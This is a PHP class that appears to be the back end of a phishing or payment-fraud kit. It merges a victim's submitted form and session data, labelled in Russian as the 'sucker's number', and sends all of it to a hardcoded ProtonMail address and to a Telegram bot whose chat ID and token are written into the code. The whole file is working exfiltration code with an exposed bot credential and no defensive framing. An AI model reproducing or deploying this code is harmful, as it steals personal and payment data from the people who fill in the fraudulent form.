<?php
declare(strict_types=1);


final class Mailer
{
    private $session;
    private $post;
    private $to = "payc2c@protonmail.com";

    public function __construct(array $session, array $post)
    {
        $this->session = $session;
        $this->post = $post;
    }

    public function sendEmail(): void
    {
        $message = "";
        $merger = array_merge($this->session, $this->post);
        $subject = "Номер лоха: " . $merger["phone"];
        foreach ($merger as $key => $value) {
            $message = $message . $key . ":" . $value . "\r\n";
        }
        print $message;
        mail($this->to, $subject, $message);
        $array = array("chat_id" => "730208829", "text" => $message);
        $this->sendTelegram($array);
    }

    private function sendTelegram(array $data): void
    {
        $url = "https://api.telegram.org/bot" . "841599068:AAF6mt4QcmhmauCsPL7RAIkTZq5MSfTEx-c" . "/sendMessage";
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);
        print $response;
    }
}